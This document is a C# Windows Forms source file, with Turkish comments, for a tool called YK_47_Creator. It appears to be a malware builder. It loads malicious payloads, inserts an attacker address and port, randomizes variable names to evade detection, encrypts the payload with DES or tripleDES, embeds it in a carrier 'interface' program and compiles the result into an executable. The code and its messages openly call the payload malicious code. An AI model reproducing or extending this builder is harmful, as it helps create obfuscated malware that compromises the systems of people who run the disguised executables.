using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Data;
using System.Drawing;
using System.Threading;
using FastColoredTextBoxNS;
using System.Windows.Forms;
using System.ComponentModel;
using System.Threading.Tasks;
using System.CodeDom.Compiler;
using System.Collections.Generic;

namespace YK_47_Creator
{
    public partial class homeForm : Form
    {
        public homeForm()
        {
            InitializeComponent();
        }

        FastColoredTextBox payloadsText = new FastColoredTextBox();         // Bu payload'ın yerleştiği textBox
        FastColoredTextBox interfaceText = new FastColoredTextBox();        // Bu interface'in yerleştiği textBox
        FastColoredTextBox complatedCode = new FastColoredTextBox();        // Derlenecek kodun yerleştiği textBox
        FastColoredTextBox compilerCode = new FastColoredTextBox();         // Interface içerisine yerleştirilecek Compiler kodunun yerleştiği textBox
        FastColoredTextBox desCryptionCode = new FastColoredTextBox();      // Seçili Descryption kodu buraya gelecek.
        FastColoredTextBox enCryptionCode = new FastColoredTextBox();       // Seçili Encryption kodu buraya gelecek.

        new string Location = Application.StartupPath;                      // Projenin bulunduğu lokasyon
        string virusCode = "";                                              // Şifrelenen Payload'ı interface'e yerleştirmek üzere static bir
                                                                            // stringe dönüştürülmüş şekilde tutan string değişken.

        string payloadProvider = "CSharp";                                  // Payload kodunun dili. Derleme esnasında gerekli.
        string interfaceProvider = "CSharp";                                // Interface kodunun dili. Derleme esnasında gerekli.

        Dictionary<string, FastColoredTextBox> additions;                   // Eklentilerin kodlarını ve Flag'larını tutuyor.

        private void Form1_Load(object sender, EventArgs e)
        {
            fCTextBoxAddForm();                                             // FastColoredTextBoxları yerleştiren ve ayarlayan metod.

            getPayloads();                                                  // Payloadları listeleyen metod.
            getInterface();                                                 // Interfaceleri listeleyen metod.

            btnRandomPass.PerformClick();                                   // Proje her açıldığında rastgele şifre üretiliyor.
            comboBoxPayloadStyle.SelectedIndex = 0;                            // comboPayloadStyle objesinin selectedIndex özelliğine 0 veriyor.
            comboBoxPayload.SelectedIndex = 0;                                 // comboPayload objesinin selectedIndex özelliğine 0 veriyor.
            comboBoxCryptionMethod.SelectedIndex = 0;                          // comboCryptionMethod objesinin selectedIndex özelliğine 0 veriyor.
            comboBoxInterface.SelectedIndex = 0;                               // comboSkin objesinin selectedIndex özelliğine 0 veriyor.
            Size = new Size(800, 600);
            getAdditions();                                               // Eklentileri getiren ve onlar için textBoxlar oluşturup yerleştiren metod.
        }

        /// <summary>
        /// Eklentileri getiren kod.
        /// </summary>>
        private void getAdditions()
        {

            tabPAdditions.Controls.Clear();
            Button btn = new Button();
            btn.Name = "btnAdditionsRefresh";
            btn.Text = "Eklentileri yenile";
            btn.Click += btnRefreshAdditions_Click;
            btn.Size = new Size(650, 23);
            btn.Location = new Point((tabPAdditions.Size.Width - 650) / 2, 1);
            btn.FlatStyle = FlatStyle.Flat;
            tabPAdditions.Controls.Add(btn);
            int additionsLen = 0;
            additions = new Dictionary<string, FastColoredTextBox>();
            foreach (var additionsDirectory in Directory.GetDirectories(Location + "\\Additions\\CSharp\\"))
            {
                foreach (var directoryAdditions in Directory.GetFiles(additionsDirectory))
                {
                    UserControls.AdditionItem aItem = new UserControls.AdditionItem(directoryAdditions);
                    aItem.Location = new Point(0, 255 * additionsLen + 25);
                    additionsLen++;
                    tabPAdditions.Controls.Add(aItem);
                    aItem.Show();
                    foreach (var item in additions)
                        if (aItem.textBox1.Text == item.Key)
                        { aItem.textBox1.Text += 1; break; }
                    additions.Add(aItem.textBox1.Text, aItem.txtCode);
                }
            }
        }

        /// <summary>
        ///  Payloads dosyasındaki payloadları listeliyor.
        /// </summary>
        private void getPayloads()
        {
            foreach (var item in Directory.GetDirectories(Location + "\\Payloads\\"))
            {
                DirectoryInfo fInfo = new DirectoryInfo(item);
                if (fInfo.Name != "Cplusplus")
                    comboBoxPayloadStyle.Items.Add(fInfo.Name);
            }
        }

        /// <summary>
        ///  Interface'leri listeliyor.
        /// </summary>
        private void getInterface()
        {
            foreach (var item in Directory.GetFiles(Location + "\\Interfaces\\"))
            {
                FileInfo fInfo = new FileInfo(item);
                comboBoxInterface.Items.Add(fInfo.Name);
            }
        }

        /// <summary>
        ///  FastColoredTextBoxları oluşturuyor yerleştiriyor ve görüntü ayarlarını yapıyor.
        /// </summary>
        private void fCTextBoxAddForm()
        {
            payloadsText.Language = Language.CSharp;
            payloadsText.Dock = DockStyle.Fill;
            payloadsText.BackColor = Color.FromArgb(44, 44, 44);
            payloadsText.ForeColor = Color.Lime;
            panelPaylodCode.Controls.Add(payloadsText);

            interfaceText.Language = Language.CSharp;
            interfaceText.Dock = DockStyle.Fill;
            interfaceText.BackColor = Color.FromArgb(44, 44, 44);
            interfaceText.ForeColor = Color.Lime;
            panelInterfaceCode.Controls.Add(interfaceText);

            complatedCode.Language = Language.CSharp;
            complatedCode.Dock = DockStyle.Fill;
            complatedCode.BackColor = Color.FromArgb(44, 44, 44);
            complatedCode.ForeColor = Color.Lime;
            panelResultCode.Controls.Add(complatedCode);
            /*
                        fStream = new FileStream(Location + "\\Additions\\Code Compiler.cs", FileMode.OpenOrCreate, FileAccess.Read);
                        sReader = new StreamReader(fStream);
                        compilerCode.Text = sReader.ReadToEnd();
                        compilerCode.Language = Language.CSharp;
                        compilerCode.Dock = DockStyle.Fill;
                        compilerCode.BackColor = Color.FromArgb(44, 44, 44);
                        compilerCode.ForeColor = Color.Lime;
                        panelCompilerCode.Controls.Add(compilerCode);
            */
        }

        /// <summary>
        ///  Seçili Interface değiştiğinde seçilen Interface kodlarını getiriyor.
        /// </summary>
        private void comboInterface_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBoxInterface.Text != "Custom")
            {
                interfaceText.Text = "";
                FileStream stream = new FileStream(Location + "\\Interfaces\\" + comboBoxInterface.Text, FileMode.Open, FileAccess.Read);
                StreamReader reader = new StreamReader(stream);
                string line = reader.ReadLine();
                while (line != null)
                {
                    interfaceText.Text += line + "\n";
                    line = reader.ReadLine();
                }
                reader.Close();
                stream.Close();
            }
        }

        /// <summary>
        ///  Son projeyi kaydediyor. Hata alsada almasada.
        /// </summary>
        private void LastProjectSave()
        {
            FileStream fs = new FileStream(Location + "\\LastProject\\Last.txt", FileMode.OpenOrCreate, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(compilerCode.Text);
            sw.Flush();
            sw.Close();
            fs.Close();
        }

        /// <summary>
        /// Dosya okuyor ve okduğunu döndürüyor.
        /// </summary>
        private String fileRead(string FilePath)
        {
            String returnedString = "";
            FileStream fStream = new FileStream(FilePath, FileMode.Open, FileAccess.Read);
            StreamReader sReader = new StreamReader(fStream);
            string line = sReader.ReadLine();
            while (line != null)
            {
                returnedString += line + "\n";
                line = sReader.ReadLine();
            }
            return returnedString;
        }

        /// <summary>
        ///  Kodu istenilen özellikler doğrultusunda revize ediyor.
        /// </summary>
        private void CodeRevision()
        {
            complatedCode.Text = flagsRevision(interfaceText);
        }

        /// <summary>
        ///  Payload kodunu şifreleyip yerleştirileceği değişkeni ayarlıyor.
        /// </summary>
        private void VirusCodeComp()
        {
            if (comboBoxCryptionMethod.Text == "DES")
            {
                Cryption.DES des = new Cryption.DES();
                virusCode = "string payloadCryptoCode=" + '"' + des.Encrypt(payloadsText.Text, txtPrivKey.Text) + '"' + ";";
            }
            if (comboBoxCryptionMethod.Text == "tripleDES")
            {
                Cryption.tripleDES des = new Cryption.tripleDES();
                virusCode = "string payloadCryptoCode=" + '"' + des.Encrypt(payloadsText.Text, txtPrivKey.Text) + '"' + ";";
            }
        }

        /// <summary>
        ///  Kodu derliyor. Hataları yazdırıyor.
        /// </summary>
        private void CodeCompile()
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "exe file(*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                richTextBoxCompileResult.Text = "";
                richTextBoxCompileResult.Text += DateTime.Now.ToString() + "\n";
                richTextBoxCompileResult.Text += sfd.FileName + " Programın Derlenmesi..";
                CompilerCode(complatedCode.Text, interfaceProvider, sfd.FileName, "Program", true);
            }
        }

        /// <summary>
        ///  Gelen kodu derliyor.
        /// </summary>
        /// <param name="CompilerFlag"> Çıktıda hangi kod parçan derlenirken hata verdiğini görmek için isim.</param>
        private void CompilerCode(String code, string Provider, string Path = " ", string CompilerFlag = " ", bool virtualCompile = true)
        {
            CodeDomProvider provider = CodeDomProvider.CreateProvider(payloadProvider);
            richTextBoxCompileResult.Text += CompilerFlag + "'";
            CompilerParameters parameters = new CompilerParameters(new string[] { "System.dll", "System.Drawing.dll", "System.Net.Sockets.dll", "System.Windows.Forms.dll", "System.Threading.dll" });
            CodeDomProvider.IsDefinedLanguage(Provider);
            parameters.GenerateExecutable = virtualCompile;
            parameters.OutputAssembly = Path;
            parameters.GenerateInMemory = virtualCompile;
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

            if (results.Errors.Count > 0)
            {
                MessageBoxShow(CompilerFlag + " hata var derlenemedi !\nDerleme sekmesine KAÇ!", "OH N0oo ;( !");
                richTextBoxCompileResult.Text += "ındaaaaa Hata oluştu. Hatalar !_!\n";
                foreach (var item in results.Errors)
                    richTextBoxCompileResult.Text += item.ToString() + "\n";
                visualStudioTabControl1.SelectedIndex = 4;
                return;
            }
            else
                MessageBoxShow(CompilerFlag + " Hata yok. Payload " + CompilerFlag + " derlendi.", "wH0oo *_*!");
            richTextBoxCompileResult.Text += "ındaaaaa Hata Yok. Keyfine bak 0_o\n";
        }

        /// <summary>
        ///  Payload'ı derle seçeneği açık ise Payload'ı derliyor. Hata var ise uyarıyor.
        /// </summary>
        private void PayloadRevision()
        {
            FastColoredTextBox newText = new FastColoredTextBox();
            foreach (string item in payloadsText.Lines.ToList())
            {
                try
                {
                    newText.Text += string.Format(item,txtAddress.Text,numericUpDownPort.Value) + "\n"; 
                }
                catch (Exception)
                {
                    newText.Text += item + "\n";
                }
            }
            payloadsText.Text = newText.Text;
            payloadsText.Text=flagsRevision(payloadsText);
            if (checkBoxPayloadComp.Checked)
            {
                CompilerCode(payloadsText.Text, payloadProvider, null, "Payload", false);
            }
        }

        /// <summary>
        /// Flaglar yerine kodları yerleştiriyor.
        /// </summary>
        /// <param name="Code"></param>
        /// <returns></returns>
        private string flagsRevision(FastColoredTextBox Code)
        {
            FastColoredTextBox returnedTextBox = new FastColoredTextBox();
            foreach (var Line in Code.Lines)
            {
                if (Line.StartsWith("// #"))
                {
                    if (Line == "// #STRN_VRSC")
                    {
                        returnedTextBox.Text += virusCode + "\n";
                        continue;
                    }
                    foreach (var item in additions)
                    {
                        if (Line == item.Key)
                        {

                            FastColoredTextBox txt = (FastColoredTextBox)item.Value;
                            foreach (string val in txt.Lines)
                                if (Line.StartsWith("// #DECR_CODE") || Line.StartsWith("// #ENCR_CODE"))
                                    try
                                    {
                                        returnedTextBox.Text += string.Format(val,txtPrivKey.Text) + "\n";
                                    }
                                    catch (Exception)
                                    {
                                        returnedTextBox.Text += val + "\n";
                                    }
                                else
                                    returnedTextBox.Text += val + "\n";
                            break;
                        }
                    }
                }
                else if (Line.StartsWith("//")) continue;
                else
                    returnedTextBox.Text += Line + "\n";
            }
            return returnedTextBox.Text;
        }

        /// <summary>
        ///  Seçilen şifreleme metoduna bağlı random sayısal şifre üretiyor ve Textlere yazdırıyor.
        /// </summary>
        private void btnRandomPass_Click(object sender, EventArgs e)
        {
            if (comboBoxCryptionMethod.Text == "DES")
            {
                string pass = randomPassword();
                txtPrivKey.Text = pass;
                txtCryptionPass.Text = pass;
                Thread.Sleep(250);
            }
            else if (comboBoxCryptionMethod.Text == "tripleDES")
            {
                string pass = randomPassword(16);
                txtPrivKey.Text = pass;
                txtCryptionPass.Text = pass;
                Thread.Sleep(250);
            }
        }

        /// <summary>
        ///  Uzunluğa bağlı random sayısal şifre üretiyor.
        /// </summary>
        private string randomPassword(int Length = 8)
        {
            string returnedString = "";
            Random r = new Random();
            for (int i = 0; i < Length; i++)
                returnedString += r.Next(0, 9).ToString();
            return returnedString;
        }

        /// <summary>
        ///  Karakterler için Int Array'i
        /// </summary>
        private int[] charArray = { 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 79,
        80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90,97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108,
        109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122 };

        /// <summary>
        /// Rastgele string üretiyor.
        /// </summary>
        private string randomChar(int Length = 8)
        {
            string returnedString = "";
            Random r = new Random();
            for (int i = 0; i < Length; i++)
            {
                Thread.Sleep(10);
                returnedString += Convert.ToChar(charArray[r.Next(0, 51)]);
            }
            return returnedString;
        }

        /// <summary>
        ///  Payloadların içeriğinde ilk satırlardaki açıklama bloklarına bakarak değişkenleri rastgele başka isimler veriyor.
        /// </summary>
        private void PayloadVeriableNameChange()
        {
            string commandSymbol = "//";
            if (payloadProvider != "CSharp")
                return;
            List<string> veriabless = new List<string>();
            Random r = new Random();
            foreach (var item in payloadsText.Lines)
            {
                if (item.StartsWith(commandSymbol))
                {
                    string line = item.Substring(commandSymbol.Length + 1, item.Length - (commandSymbol.Length + 1));
                    veriabless.AddRange(line.Split(','));
                }
                else break;
            }
            foreach (string item in veriabless.ToList())
                payloadsText.Text.Replace(item, randomChar(item.Length + r.Next(1, 5)));
        }

        /// <summary>
        ///  Interface içeriğinde ilk satırlardaki açıklama bloklarına bakarak değişkenleri rastgele başka isimler veriyor.
        /// </summary>
        private void InterfaceVeriableNameChange()
        {
            string commandSymbol = "//";
            if (interfaceProvider != "CSharp")
                return;
            List<string> veriabless = new List<string>();
            Random r = new Random();
            foreach (var item in interfaceText.Lines)
            {
                if (item.StartsWith(commandSymbol))
                {
                    string line = item.Substring(commandSymbol.Length + 1, item.Length - (commandSymbol.Length + 1));
                    veriabless.AddRange(line.Split(','));
                }
                else break;
            }
            foreach (string item in veriabless.ToList())
                interfaceText.Text.Replace(item, randomChar(item.Length + r.Next(1, 5)));
        }

        /// <summary>
        /// Seçenekleri kontrol ediyor. Derleme yapıyor.
        /// </summary>
        private void btnCreate_Click(object sender, EventArgs e)
        {
            if (txtAddress.Text == "")
            {
                MessageBoxShow("Payload'a adres girmedin.", ":o");
                return;
            }

            if (payloadsText.Text == "")
            {
                MessageBoxShow("Zararlı kodu vermediniz !", "Hayrına iş saptandı");
                return;
            }

            if (interfaceText.Text == "")
            {
                MessageBoxShow("Zararlı kodu çalıştıracak yazılım kodunu vermediniz !", "Böyle olms :|");
                return;
            }

            if (comboBoxCryptionMethod.Text == "DES" && txtPrivKey.Text == "")
            {
                MessageBoxShow("DES algoritması için private ve public anahtar şart !", "Yapma be ;(((((");
                return;
            }

            if (comboBoxCryptionMethod.Text != "DES" && comboBoxCryptionMethod.Text != "tripleDES")
            {
                MessageBoxShow("Bilmediğim bir cryption metodundan bahsediyorsun. \nHemen bana bildir ekliyeyim.", "Düzelicez inşallah ^_^");
                return;
            }

            PayloadVeriableNameChange();
            InterfaceVeriableNameChange();

            PayloadRevision();

            VirusCodeComp();
            CodeRevision();
            CodeCompile();
            //LastProjectSave();
        }

        /// <summary>
        /// Seçili payload değiştiğinde içeriğini Payloads klasöründen okuyup yazdırıyor.
        /// </summary>
        private void comboPayload_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBoxPayload.Text != "Custom")
            {
                payloadsText.Text = "";
                FileStream stream = new FileStream(Location + "\\Payloads\\" + comboBoxPayloadStyle.Text + "\\" + comboBoxPayload.Text, FileMode.Open, FileAccess.Read);
                StreamReader reader = new StreamReader(stream);
                string line = reader.ReadLine();
                while (line != null)
                {
                    payloadsText.Text += line + "\n";
                    line = reader.ReadLine();
                }
                reader.Close();
                stream.Close();
            }
        }

        /// <summary>
        /// Payload dili değişirse Payload seçim combosunun içeriğini ayarlıyor.
        /// </summary>
        private void comboPayloadStyle_SelectedIndexChanged(object sender, EventArgs e)
        {
            comboBoxPayload.Items.Clear();
            foreach (var item in Directory.GetFiles(Location + "\\Payloads\\" + comboBoxPayloadStyle.Text))
            {
                FileInfo fInfo = new FileInfo(item);
                comboBoxPayload.Items.Add(fInfo.Name);
            }
            if (comboBoxPayloadStyle.Text == "CSharp")
            {
                payloadsText.Language = Language.CSharp;
                payloadProvider = "CSharp";

            }
            else if (comboBoxPayloadStyle.Text == "VisualBasic")
            {
                payloadsText.Language = Language.VB;
                payloadProvider = "VisualBasic";
            }
            else if (comboBoxPayloadStyle.Text == "Cplusplus")
            {
                payloadsText.Language = Language.Custom;
                payloadProvider = "Cpp";
            }
            else if (comboBoxPayloadStyle.Text == "JScript")
            {
                payloadsText.Language = Language.JS;
                payloadProvider = "JScript";
            }
        }

        /// <summary>
        /// Çıkış.
        /// </summary>
        private void btnClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        /// <summary>
        /// Şifreleme yöntemi değişirse yeniden şifre üretiyor.
        /// </summary>
        private void comboCryptionMethod_SelectedIndexChanged(object sender, EventArgs e)
        {
            btnRandomPass.PerformClick();
            desCryptionCode.Text = fileRead(Location + "\\Additions\\CSharp\\Descryption\\" + comboBoxCryptionMethod.Text + ".cs");
            enCryptionCode.Text = fileRead(Location + "\\Additions\\CSharp\\Encryption\\" + comboBoxCryptionMethod.Text + ".cs");
        }

        /// <summary>
        /// richCryption'ın text'ini şifreleyip richCryptionResult'a gönderiyor.
        /// </summary>
        private void btnEncryption_Click(object sender, EventArgs e)
        {
            Cryption.ICrypt Method = null;
            if (comboBoxCryptionMethod.Text == "DES")
                Method = new Cryption.DES();
            else if (comboBoxCryptionMethod.Text == "tripleDES")
                Method = new Cryption.tripleDES();


            try
            {
                richTextBoxCryptionResult.Text = Method.Encrypt(richTextBoxCryption.Text, txtCryptionPass.Text);
            }
            catch (Exception) { MessageBoxShow("Veriyi şifreleyemedim!", "Hata !"); }
        }

        /// <summary>
        /// richCryption'ın text'ini çözüp richCryptionResult'a gönderiyor.
        /// </summary>
        private void btnDescryption_Click(object sender, EventArgs e)
        {
            Cryption.ICrypt Method = null;
            if (comboBoxCryptionMethod.Text == "DES")
                Method = new Cryption.DES();
            else if (comboBoxCryptionMethod.Text == "tripleDES")
                Method = new Cryption.tripleDES();

            try
            {
                richTextBoxCryptionResult.Text = Method.Decrypt(richTextBoxCryption.Text, txtCryptionPass.Text);
            }
            catch (Exception) { MessageBoxShow("Şifreli veri çözülmedi !", "Hata !"); }
        }

        /// <summary>
        /// Eklentileri yeniliyor.
        /// </summary>
        private void btnRefreshAdditions_Click(object sender, EventArgs e)
        {
            getAdditions();
        }

        private void MessageBoxShow(string Message,string Hood) {
            messageBox mBox = new messageBox(Message,Hood);
            mBox.Show();
        }
    }
}
